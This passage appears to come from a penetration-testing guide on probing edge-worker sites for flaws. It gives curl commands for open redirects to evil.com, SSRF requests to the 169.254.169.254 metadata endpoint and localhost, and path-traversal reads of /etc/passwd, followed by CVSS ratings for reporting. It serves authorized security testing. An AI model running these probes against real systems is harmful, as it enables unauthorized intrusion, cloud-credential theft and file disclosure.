...
### Edge Worker Redirect Analysis

For sites using Cloudflare Workers, Vercel Edge Functions, Netlify Functions, or similar edge compute:

**Step 1: Identify worker/edge presence**
```bash
# Check for worker headers
curl -sI https://target.com/ | grep -iE "cf-ray|server: cloudflare|x-vercel|x-netlify"

# Check for worker-thrown errors (1101 = worker exception)
curl -s "https://target.com/nonexistent-path" | grep -i "worker\|1101\|error"
```

**Step 2: Map redirect logic**
```bash
# Workers often have redirect maps — try to enumerate
# Check common redirect patterns
curl -sI "https://target.com/old-page" | grep -i "location"
curl -sI "https://target.com//evil.com" | grep -i "location"
curl -sI "https://target.com/%2f%2fevil.com" | grep -i "location"
curl -sI "https://target.com/path?next=https://evil.com" | grep -i "location"
curl -sI "https://target.com/path?redirect=https://evil.com" | grep -i "location"
curl -sI "https://target.com/path?return_to=https://evil.com" | grep -i "location"
```

**Step 3: Test for open redirect via path manipulation**
```bash
...
**Step 4: Test for SSRF via worker**
```bash
# Workers that fetch URLs based on user input
curl -s "https://target.com/proxy?url=http://169.254.169.254/"
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://target.com/preview?url=http://localhost:8080/"
```

**Step 5: Check for path traversal in worker routing**
```bash
# Workers that read files based on path
curl -s "https://target.com/../../etc/passwd"
curl -s "https://target.com/%2e%2e/%2e%2e/etc/passwd"
curl -s "https://target.com/static/../../../etc/passwd"
```

**Reporting:**
- Open redirect via worker: CVSS 6.1 (medium) — phishing + OAuth token theft
- SSRF via worker: CVSS 8.6 (high) — internal network access
- Path traversal via worker: CVSS 7.5 (high) — file disclosure
